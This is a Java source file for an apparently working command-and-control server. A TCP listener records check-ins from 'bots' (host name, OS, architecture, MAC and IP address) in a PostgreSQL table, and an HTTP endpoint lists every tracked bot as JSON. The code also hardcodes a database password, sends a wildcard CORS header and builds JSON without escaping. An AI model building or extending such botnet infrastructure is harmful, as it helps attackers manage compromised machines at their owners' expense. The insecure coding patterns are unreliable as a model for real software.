import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.sql.*;
import java.util.concurrent.Executors;

public class C2Server {
    public static void main(String[] args) throws IOException {

        new Thread(C2Server::startTCPServer).start();

        startHTTPServer();
        
    }

    public static void startTCPServer(){

        int port = 9000;
        try (ServerSocket serverSocket = new ServerSocket(port)) {
            System.out.println("TCP C2 server listening on port " + port);

            while (true) {
                Socket clientSocket = serverSocket.accept();
                new Thread(new ClientHandler(clientSocket)).start();
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    static class ClientHandler implements Runnable{

        private final Socket socket;

        ClientHandler(Socket socket){
            this.socket = socket;

        }

        public void run(){

            String hostName;
            String os;
            String architecture;
            String macAddress;
            String ipAddress;

            try (
                InputStream inputStream = socket.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

                OutputStream outputStream = socket.getOutputStream();
                PrintWriter printWriter = new PrintWriter(outputStream, true)
            ) {

                hostName = reader.readLine();
                os = reader.readLine();
                architecture = reader.readLine();
                macAddress = reader.readLine();
                ipAddress = socket.getInetAddress().getHostAddress();

                try(
                        Connection connection = DriverManager.getConnection("jdbc:postgresql://localhost:5432/c2db", "postgres", "1214");
                        PreparedStatement statement = connection.prepareStatement("INSERT INTO bot_checkins (host_name, os, architecture, mac_address, ip_address) " +
                                "VALUES (?, ?, ?, ?, ?) " +
                                "ON CONFLICT(mac_address) " +
                                "DO UPDATE SET " +
                                "host_name = EXCLUDED.host_name, " +
                                "os = EXCLUDED.os, " +
                                "architecture = EXCLUDED.architecture, " +
                                "ip_address = EXCLUDED.ip_address, " +
                                "timestamp = CURRENT_TIMESTAMP")
                ){
                    statement.setString(1, hostName);
                    statement.setString(2, os);
                    statement.setString(3, architecture);
                    statement.setString(4, macAddress);
                    statement.setString(5, ipAddress);

                    statement.executeUpdate();
                    printWriter.println("Check-in OK");
                    System.out.println("Check-in saved: " + hostName + " (" + ipAddress + ")");

                } catch (SQLException e) {
                    e.printStackTrace();
                    printWriter.println("DB error");
                }

                socket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public static void startHTTPServer() throws IOException {

        HttpServer httpServer = HttpServer.create(new InetSocketAddress(8080), 0);
        httpServer.createContext("/api/bots", new BotApiHandler());
        httpServer.setExecutor(Executors.newFixedThreadPool(4));
        httpServer.start();
        System.out.println("HTTP API server running on port 8080");
    }

    static class BotApiHandler implements HttpHandler{

        @Override
        public void handle(HttpExchange exchange) throws IOException {

            if (!exchange.getRequestMethod().equalsIgnoreCase("GET")) {
                exchange.sendResponseHeaders(405, -1); // Method Not Allowed
                return;
            }

            StringBuilder json = new StringBuilder();
            json.append("[");

            try(
                    Connection conn = DriverManager.getConnection("jdbc:postgresql://localhost:5432/c2db", "postgres", "1214");
                    Statement stmt = conn.createStatement();
                    ResultSet rs = stmt.executeQuery("SELECT * FROM bot_checkins")
            ) {
                    while(rs.next()){

                        json.append(String.format(
                                "{\"host_name\":\"%s\",\"os\":\"%s\",\"architecture\":\"%s\",\"mac_address\":\"%s\",\"ip_address\":\"%s\",\"timestamp\":\"%s\"},",
                                rs.getString("host_name"),
                                rs.getString("os"),
                                rs.getString("architecture"),
                                rs.getString("mac_address"),
                                rs.getString("ip_address"),
                                rs.getTimestamp("timestamp")
                        ));
                    }


            } catch (SQLException e) {
                e.printStackTrace();
                exchange.sendResponseHeaders(500, -1);
                return;
            }

            if (json.charAt(json.length() - 1) == ',') {
                json.setLength(json.length() - 1); // remove last comma
            }
            json.append("]");

            byte[] respBytes = json.toString().getBytes(StandardCharsets.UTF_8);
            exchange.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
            exchange.getResponseHeaders().set("Content-Type", "application/json");
            exchange.sendResponseHeaders(200, respBytes.length);
            OutputStream os = exchange.getResponseBody();
            os.write(respBytes);
            os.close();
        }
    }
}
